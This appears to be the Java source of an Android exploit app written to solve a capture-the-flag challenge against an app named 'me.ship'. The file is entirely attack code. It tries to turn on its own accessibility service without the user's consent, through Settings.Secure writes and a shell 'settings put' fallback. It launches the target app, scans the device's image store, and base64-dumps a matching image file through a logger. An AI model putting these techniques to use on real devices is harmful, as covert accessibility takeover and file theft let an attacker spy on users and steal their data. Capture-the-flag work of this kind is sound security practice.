package ctf.probe;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private static final String SVC = "ctf.probe/ctf.probe.Grab";
    private static final String VICTIM = "me.ship";
    private boolean dumped = false;
    private int tick = 0;

    @Override
    protected void onCreate(Bundle b) {
        try {
            super.onCreate(b);
        } catch (Throwable ignored) {
        }
        try {
            TextView tv = new TextView(this);
            tv.setText("probe");
            setContentView(tv);
        } catch (Throwable ignored) {
        }

        L.s("=== probe alive ===");
        perms();
        fgs();
        enableA11y();

        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                startVictim();
            }
        }, 1500);
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                tick++;
                images();
                if (tick == 2) {
                    L.s("a11y now = " + Settings.Secure.getString(
                            getContentResolver(), "enabled_accessibility_services"));
                }
                if (tick < 25) h.postDelayed(this, 2000);
            }
        }, 3000);
    }

    private void perms() {
        try {
            PackageInfo pi = getPackageManager().getPackageInfo(
                    getPackageName(), PackageManager.GET_PERMISSIONS);
            StringBuilder ok = new StringBuilder("GRANTED:");
            StringBuilder no = new StringBuilder("DENIED:");
            for (int i = 0; i < pi.requestedPermissions.length; i++) {
                String p = pi.requestedPermissions[i].replace("android.permission.", "");
                boolean g = (pi.requestedPermissionsFlags[i]
                        & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0;
                (g ? ok : no).append(' ').append(p);
            }
            L.s(ok.toString());
            L.s(no.toString());
        } catch (Throwable t) {
            L.s("perms err " + t);
        }
    }

    private void fgs() {
        try {
            startForegroundService(new Intent(this, Fg.class));
        } catch (Throwable t) {
            L.s("fgs start err " + t);
        }
    }

    private void enableA11y() {
        ContentResolver cr = getContentResolver();
        try {
            Settings.Secure.putString(cr, "enabled_accessibility_services", SVC);
            Settings.Secure.putString(cr, "accessibility_enabled", "1");
            L.s("A11Y WRITE OK -> " + Settings.Secure.getString(
                    cr, "enabled_accessibility_services"));
            return;
        } catch (Throwable t) {
            L.s("A11Y WRITE FAILED " + t);
        }
        try {
            Process p = Runtime.getRuntime().exec(new String[]{
                    "sh", "-c",
                    "settings put secure enabled_accessibility_services " + SVC
                            + "; settings put secure accessibility_enabled 1; "
                            + "settings get secure enabled_accessibility_services"});
            byte[] o = readAll(p.getInputStream());
            byte[] e = readAll(p.getErrorStream());
            L.s("exec settings out=" + new String(o).trim() + " err=" + new String(e).trim());
        } catch (Throwable t) {
            L.s("exec settings err " + t);
        }
    }

    private static byte[] readAll(InputStream in) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int r;
        while ((r = in.read(buf)) > 0) bo.write(buf, 0, r);
        return bo.toByteArray();
    }

    private void startVictim() {
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName(VICTIM, VICTIM + ".MainActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            L.s("victim started");
        } catch (Throwable t) {
            L.s("victim start err " + t);
        }
    }

    private void images() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media._ID,
                            MediaStore.Images.Media.DISPLAY_NAME},
                    null, null, null);
            if (c == null) return;
            while (c.moveToNext()) {
                String id = c.getString(0);
                String nm = c.getString(1);
                L.s("IMAGE " + id + " " + nm);
                if (!dumped && nm != null && nm.startsWith("ship-me-label")) {
                    dumped = true;
                    dump(Uri.withAppendedPath(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id), nm);
                }
            }
            c.close();
        } catch (Throwable t) {
            L.s("images err " + t);
        }
    }

    private void dump(Uri u, String nm) {
        try {
            InputStream in = getContentResolver().openInputStream(u);
            byte[] png = readAll(in);
            in.close();
            String b64 = Base64.encodeToString(png, Base64.NO_WRAP);
            L.s("PNGSTART " + nm + " bytes=" + png.length);
            int idx = 0;
            for (int i = 0; i < b64.length(); i += 850) {
                L.s("PNG" + (idx++) + ":" + b64.substring(i, Math.min(b64.length(), i + 850)));
            }
            L.s("PNGEND");
        } catch (Throwable t) {
            L.s("dump err " + t);
        }
    }
}
